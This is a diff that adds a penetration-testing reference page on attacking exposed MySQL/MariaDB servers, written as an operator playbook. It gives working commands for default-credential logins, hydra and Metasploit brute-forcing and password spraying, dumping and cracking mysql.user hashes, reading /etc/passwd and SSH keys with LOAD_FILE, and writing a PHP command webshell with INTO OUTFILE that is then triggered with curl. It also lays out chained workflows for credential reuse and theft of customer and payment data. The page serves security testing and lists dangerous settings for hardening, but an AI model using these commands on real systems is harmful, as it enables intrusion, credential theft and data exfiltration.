@@ -1,0 +1,405 @@
+---
+title: MySQL
+description: MySQL / MariaDB enumeration - default credential testing, schema and table enumeration, password-hash extraction from mysql.user, and file read/write primitives via INTO OUTFILE / LOAD_FILE.
+mitre: [T1046, T1078, T1213, T1552.001]
+d3fend: [D3-NTA]
+impact: [DataExfil, CredentialTheft, FileRead, FileWrite]
+sidebar:
+  order: 9
+  label: MySQL
+---
+
+## TL;DR
+
+MySQL and its fork MariaDB are the most-deployed open-source relational databases. They listen on TCP 3306 by default. When exposed to the public internet - usually by accident - the operator-relevant findings are: default/empty credentials on the `root` account, weak passwords on application users, and (with sufficient privileges) file read/write primitives that can be turned into RCE on the database host.
+
+```
+# 1. Service scan
+nmap -sV -sC -p3306 --script mysql* <target>
+
+# 2. Try common defaults
+mysql -u root -h <target>
+mysql -u root -p<password> -h <target>
+mysql -u root -p'' -h <target>
+
+# 3. Enumerate databases and tables
+mysql> show databases;
+mysql> use <database>;
+mysql> show tables;
+mysql> select * from <table> limit 10;
+
+# 4. Dump password hashes
+mysql> select user, host, authentication_string from mysql.user;
+
+# 5. File read (if FILE privilege)
+mysql> select load_file('/etc/passwd');
+```
+
+Success indicator: successful connection, `show databases` returns more than the system schemas, `mysql.user` query returns hashes.
+
+## Protocol overview
+
+MySQL uses a binary client/server protocol over TCP 3306. The handshake establishes a connection, the server sends a salt, the client sends credentials hashed with the salt, the server validates against `mysql.user`. After auth, the client sends SQL queries as binary-framed text and the server returns result sets in a tabular binary format.
+
+### MySQL vs MariaDB
+
+| Aspect | MySQL | MariaDB |
+| --- | --- | --- |
+| Origin | Sun → Oracle (closed-source company, open-source code) | Fork of MySQL after Oracle acquired Sun |
+| Lead developer | Oracle (post-2010) | Same people who originally wrote MySQL |
+| Wire protocol | Identical | Identical |
+| SQL syntax | Mostly identical | Mostly identical (with some MariaDB-specific extensions) |
+| Default authentication plugin | `caching_sha2_password` (MySQL 8+) | `mysql_native_password` |
+| Default port | 3306 | 3306 |
+
+For operator purposes they're interchangeable. The `mysql` command-line client connects to both. Tooling like Hydra, sqlmap, and Metasploit modules work against either.
+
+### Default databases / schemas
+
+Every MySQL install has these built-in databases:
+
+| Database | Contents |
+| --- | --- |
+| `information_schema` | Metadata about all other databases - tables, columns, privileges. Read-only. |
+| `mysql` | Server's internal state - user accounts, password hashes, grants, replication state. |
+| `performance_schema` | Runtime performance metrics |
+| `sys` | Higher-level views into `performance_schema` data |
+
+The `mysql.user` table is the prize - it contains username, host pattern, password hash, and granted privileges for every account.
+
+## Default configuration
+
+Linux config typically lives at `/etc/mysql/mysql.conf.d/mysqld.cnf`:
+
+```ini
+[client]
+port            = 3306
+socket          = /var/run/mysqld/mysqld.sock
+
+[mysqld]
+skip-host-cache
+skip-name-resolve
+user            = mysql
+pid-file        = /var/run/mysqld/mysqld.pid
+socket          = /var/run/mysqld/mysqld.sock
+port            = 3306
+basedir         = /usr
+datadir         = /var/lib/mysql
+tmpdir          = /tmp
+lc-messages-dir = /usr/share/mysql
+explicit_defaults_for_timestamp
+symbolic-links  = 0
+```
+
+By default, MySQL binds to `127.0.0.1` - only accepts local connections. The dangerous deviation is changing `bind-address = 0.0.0.0` (or commenting it out) to allow remote connections.
+
+## Dangerous settings
+
+| Setting | Why it's bad |
+| --- | --- |
+| `bind-address = 0.0.0.0` | Listens on all interfaces - accessible from the network/internet |
+| Empty password on `root` | Default in older MySQL installs, sometimes left as-is |
+| `root@%` (user `root` allowed from any host) | Root accessible from any source IP |
+| `secure_file_priv =` (empty) | `LOAD_FILE` / `INTO OUTFILE` can read/write anywhere on disk the mysql user can reach |
+| `secure_file_priv = NULL` | File operations completely disabled (good - the safe setting) |
+| `secure_file_priv = /var/lib/mysql-files` | File operations restricted to that directory (good default since MySQL 5.7) |
+| `local_infile = 1` | `LOAD DATA LOCAL INFILE` can read from the *client's* filesystem (relevant when you're the server in a server-side attack) |
+| `general_log = on` + `general_log_file = ...` | All queries logged - if you can read the log file, all queries (and parameters) are visible |
+| `debug` set | Verbose debugging exposed |
+| Unencrypted connections accepted | Credentials and query data exposed on the wire |
+
+The big two are `bind-address = 0.0.0.0` (the precondition for everything) and either empty/default `root` password OR weak password on a privileged account. With those, the operator gets in immediately.
+
+`secure_file_priv` empty (not unset, not NULL - *explicitly empty*) is the setting that turns a credentialed connection into file-read/write/RCE.
+
+## Footprinting commands
+
+### Service scan
+
+```shell
+sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
+```
+
+```
+PORT     STATE SERVICE     VERSION
+3306/tcp open  nagios-nsca Nagios NSCA
+| mysql-info:
+|   Protocol: 10
+|   Version: 8.0.26-0ubuntu0.20.04.1
+|   Thread ID: 13
+|   Capabilities flags: 65535
+|   Status: Autocommit
+|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
+|_  Auth Plugin Name: caching_sha2_password
+```
+
+Key data points:
+
+- **Version**: `8.0.26-0ubuntu0.20.04.1` - exact version + distro patch level. Match to CVE database.
+- **Auth Plugin**: `caching_sha2_password` (MySQL 8) vs `mysql_native_password` (MariaDB / older MySQL). Determines hash format and attack tooling.
+
+Other mysql NSE scripts that can run:
+
+```
+mysql-brute              # credential brute-force
+mysql-databases          # list databases (needs creds)
+mysql-dump-hashes        # dump password hashes (needs creds with mysql.user read)
+mysql-empty-password     # test for empty password on common accounts
+mysql-enum              # username enumeration via auth-error timing
+mysql-info              # banner / version (runs by default in -sV)
+mysql-users             # list user accounts (needs creds)
+mysql-variables         # list server variables (needs creds)
+mysql-vuln-cve2012-2122 # specific CVE check
+```
+
+Watch out for **false positives** on automated mysql scripts. The `mysql-empty-password` script sometimes claims accounts have empty passwords when they don't - verify manually.
+
+### Connecting
+
+```shell
+# Empty password
+mysql -u root -h 10.129.14.128
+
+# Explicit password (note: NO space between -p and the password)
+mysql -u root -pP4SSw0rd -h 10.129.14.128
+
+# Prompt for password
+mysql -u root -p -h 10.129.14.128
+
+# Specify database on connect
+mysql -u root -pP4SSw0rd -h 10.129.14.128 -D mydb
+
+# Custom port
+mysql -u root -pP4SSw0rd -h 10.129.14.128 -P 33060
+```
+
+Connection-refused responses to know:
+
+```
+ERROR 1045 (28000): Access denied for user 'root'@'<your-ip>' (using password: NO)
+# Account exists, host pattern allows your IP, but credentials wrong (or empty given when one expected)
+
+ERROR 1130 (HY000): Host '<your-ip>' is not allowed to connect to this MySQL server
+# Account exists but host pattern doesn't allow your IP
+# Worth probing - sometimes a different source IP (VPN, hop host) works
+
+ERROR 2003 (HY000): Can't connect to MySQL server on '<target>' (111)
+# Port closed or filtered
+
+ERROR 2002 (HY000): Can't connect to local MySQL server through socket
+# Wrong syntax - used socket connection instead of TCP. Add -h <target>
+```
+
+### Database enumeration
+
+```sql
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| customer_db        |
+| billing            |
++--------------------+
+
+mysql> use customer_db;
+Database changed
+
+mysql> show tables;
++-----------------------+
+| Tables_in_customer_db |
++-----------------------+
+| customers             |
+| orders                |
+| payment_methods       |
+| sessions              |
++-----------------------+
+
+mysql> show columns from customers;
++----------------+--------------+------+-----+---------+----------------+
+| Field          | Type         | Null | Key | Default | Extra          |
++----------------+--------------+------+-----+---------+----------------+
+| id             | int(11)      | NO   | PRI | NULL    | auto_increment |
+| email          | varchar(255) | NO   | UNI | NULL    |                |
+| password_hash  | varchar(255) | NO   |     | NULL    |                |
+| name           | varchar(255) | YES  |     | NULL    |                |
+| created_at     | datetime     | NO   |     | NULL    |                |
++----------------+--------------+------+-----+---------+----------------+
+
+mysql> select * from customers limit 5;
+```
+
+The `information_schema` route to the same info, queryable in one statement:
+
+```sql
+mysql> select table_schema, table_name, column_name
+       from information_schema.columns
+       where table_schema not in ('information_schema','performance_schema','sys','mysql');
+```
+
+Search for interesting columns across the entire server:
+
+```sql
+mysql> select table_schema, table_name, column_name
+       from information_schema.columns
+       where column_name like '%password%'
+          or column_name like '%token%'
+          or column_name like '%api_key%'
+          or column_name like '%secret%';
+```
+
+### Password hash extraction
+
+The `mysql.user` table holds the auth hashes:
+
+```sql
+mysql> use mysql;
+mysql> select user, host, authentication_string from user;
++------------------+-----------+-------------------------------------------+
+| user             | host      | authentication_string                     |
++------------------+-----------+-------------------------------------------+
+| root             | localhost | $A$005$O$$<base64 hash>                    |
+| root             | %         | $A$005$O$$<base64 hash>                    |
+| app_user         | %         | *5D7C9CCD<...>                            |
+| backup_service   | 10.0.0.%  | *81F5E21E<...>                            |
++------------------+-----------+-------------------------------------------+
+```
+
+Two hash formats:
+
+- **`*XXXX...` (40 hex chars after the `*`)** - `mysql_native_password`, SHA1(SHA1(password)). Crackable with `hashcat -m 300`.
+- **`$A$005$...`** - `caching_sha2_password` (MySQL 8 default), SHA-256 + scrypt-like. Crackable with `hashcat -m 7401` (slow).
+
+For older MySQL versions, the column might be named `password` instead of `authentication_string`.
+
+### Privilege check
+
+```sql
+mysql> select current_user();
+mysql> show grants;
+mysql> show grants for 'app_user'@'%';
+```
+
+A "all privileges with grant option" account is operationally root within the database. The `FILE` privilege specifically enables file read/write:
+
+```sql
+mysql> show variables like 'secure_file_priv';
++------------------+-----------------------+
+| Variable_name    | Value                 |
++------------------+-----------------------+
+| secure_file_priv | NULL                  |   -- file ops disabled (safe)
+| secure_file_priv | /var/lib/mysql-files/ |   -- file ops sandboxed (default 5.7+)
+| secure_file_priv |                       |   -- EMPTY = file ops anywhere
++------------------+-----------------------+
+```
+
+### File read via LOAD_FILE
+
+Requires `FILE` privilege and `secure_file_priv` set to a path or empty:
+
+```sql
+mysql> select load_file('/etc/passwd');
++--------------------------------------------------------------------+
+| load_file('/etc/passwd')                                           |
++--------------------------------------------------------------------+
+| root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+... |
++--------------------------------------------------------------------+
+
+mysql> select load_file('/etc/shadow');
+-- Empty result if mysql user can't read it (almost always)
+
+mysql> select load_file('/root/.ssh/id_rsa');
+-- Empty result unless mysqld runs as root (almost never)
+```
+
+Mysqld typically runs as the `mysql` Unix user - can read its own data files and world-readable files, but not `/etc/shadow` or other-users' private files.
+
+### File write via INTO OUTFILE
+
+Requires `FILE` privilege and matching `secure_file_priv`:
+
+```sql
+mysql> select '<?php system($_GET["cmd"]); ?>'
+       into outfile '/var/www/html/shell.php';
+```
+
+If the MySQL server and the web server share a host (common in LAMP setups) and the web root is writable by the mysql user, this drops a PHP shell. Hit it with:
+
+```shell
+curl 'http://target.com/shell.php?cmd=id'
+```
+
+`INTO OUTFILE` will *fail* if the destination file already exists - there's no overwrite. Pick a new filename per attempt.
+
+### UDF (User-Defined Function) → RCE
+
+With `FILE` and write access to MySQL's plugin directory, you can load a UDF that executes shell commands. This is more involved (need to compile a `.so` for the target architecture, write it to the right path, then `CREATE FUNCTION`) but is the canonical "creds on a database = RCE on the host" path. See [this writeup](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql) for the full chain.
+
+### Credential brute-force
+
+```shell
+hydra -L users.txt -P passwords.txt -t 4 mysql://<target>
+
+# Faster, with a single password against many users (spray)
+hydra -L users.txt -p 'Welcome123' mysql://<target>
+```
+
+Or Metasploit:
+
+```shell
+msf > use auxiliary/scanner/mysql/mysql_login
+msf > set RHOSTS <target>
+msf > set USER_FILE users.txt
+msf > set PASS_FILE passwords.txt
+msf > run
+```
+
+Or sqlmap for SQL-injection-targeted MySQL backends (different attack surface - see the [SQL Injection](/codex/web/sqli/) cluster).
+
+## Common chained workflows
+
+**Default creds → mysql.user dump → cracked hashes → reuse:**
+1. `mysql -u root -h target` (empty password works)
+2. `select * from mysql.user;` → harvest hashes
+3. `hashcat -m 300` → cracked passwords
+4. Try those passwords against other services (SSH, RDP, etc.) on the same network
+
+**Read access → app data → application-level findings:**
+1. Connect with limited account
+2. Dump the application's database
+3. Cracked user-password hashes give login on the application itself
+4. Stored data (PII, payment info) is the finding
+
+**FILE privilege → INTO OUTFILE → webshell:**
+1. Confirm `secure_file_priv` empty and FILE privilege held
+2. Identify web root path (`/var/www/html/`, `/usr/share/nginx/html/`, etc.)
+3. Write PHP/JSP shell, trigger via HTTP
+
+**FILE privilege → LOAD_FILE → key material:**
+1. Read `/etc/passwd` to enumerate users
+2. Read `/var/lib/mysql/mysql.user.MYD` (the raw user table - old MyISAM versions)
+3. Read SSH public keys, web app configs, anything mysql user can read
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Service scan | `nmap -sV -sC -p3306 --script mysql* <target>` |
+| Empty-password test | `mysql -u root -h <target>` |
+| Login (no space after -p) | `mysql -u root -p<password> -h <target>` |
+| List databases | `show databases;` |
+| Switch database | `use <db>;` |
+| List tables | `show tables;` |
+| Table columns | `show columns from <table>;` or `describe <table>;` |
+| Dump hashes | `select user, host, authentication_string from mysql.user;` |
+| Current user | `select current_user();` |
+| Show grants | `show grants;` |
+| File-read setting | `show variables like 'secure_file_priv';` |
+| Read file | `select load_file('/path/to/file');` |
+| Write file | `select '<content>' into outfile '/path/to/file';` |
+| Brute-force | `hydra -L users -P pass mysql://<target>` |
